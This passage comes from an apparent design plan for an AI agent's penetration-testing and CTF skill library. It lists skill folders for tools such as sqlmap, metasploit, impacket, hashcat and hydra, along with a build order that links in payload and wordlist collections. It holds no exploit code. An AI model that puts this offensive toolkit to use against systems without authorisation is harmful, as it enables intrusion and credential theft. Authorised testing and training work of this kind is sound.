│   ├── ffuf/SKILL.md
│   └── feroxbuster/SKILL.md
├── scanning/
│   ├── nuclei/SKILL.md
│   └── nikto/SKILL.md
├── web-vulns/                         # §6 — one class per folder
│   ├── sqli/SKILL.md
│   ├── xss/SKILL.md
│   ├── ssrf/SKILL.md
│   └── idor/SKILL.md
├── exploitation/
│   ├── sqlmap/SKILL.md
│   ├── metasploit/SKILL.md
│   └── burpsuite/SKILL.md
├── ad/
│   ├── netexec/SKILL.md
│   ├── bloodhound/SKILL.md
│   └── impacket/SKILL.md
├── passwords/
│   ├── hashcat/SKILL.md
│   └── hydra/SKILL.md
├── privesc/
│   ├── linpeas/SKILL.md
│   └── pspy/SKILL.md
├── ctf-pwn/
│   ├── pwntools/SKILL.md
│   └── ghidra/SKILL.md
├── ctf-forensics/
│   ├── wireshark/SKILL.md
│   ├── binwalk/SKILL.md
│   └── stego/SKILL.md
└── _shared/                           # RAG + wordlists referenced by skills
    ├── wordlists/                     # SecLists, rockyou, rules
    ├── payloads/                      # PayloadsAllTheThings
    └── rag/                           # HackTricks, GTFOBins, nuclei notes, per-target notes
```

---

## 9. Build order for your coder (recommended)

1. **Finalize the template + schema** (§2–§3) and validate one skill end-to-end (`nmap`) against the runtime so triggering + `Read` works.
2. **Recon tier-1** (`subfinder`, `httpx`, `nmap`) + the `recon-pipeline` fork.
3. **Discovery + scanning** (`ffuf`, `feroxbuster`, `nuclei`).
4. **Web-vuln category skills** (§6) with RAG wired to PayloadsAllTheThings/HackTricks.
5. **Exploitation + AD + passwords + privesc** (the HTB/OSCP core).
6. **CTF pwn/RE/forensics/stego** last (highest `effort`, most specialized).
7. **Shared data layer** (§7) in parallel from step 2 onward.

For each tool, fill the six sections from the matching catalog entry above, then tune `model`/`effort`/`context`/`agent` using §4.
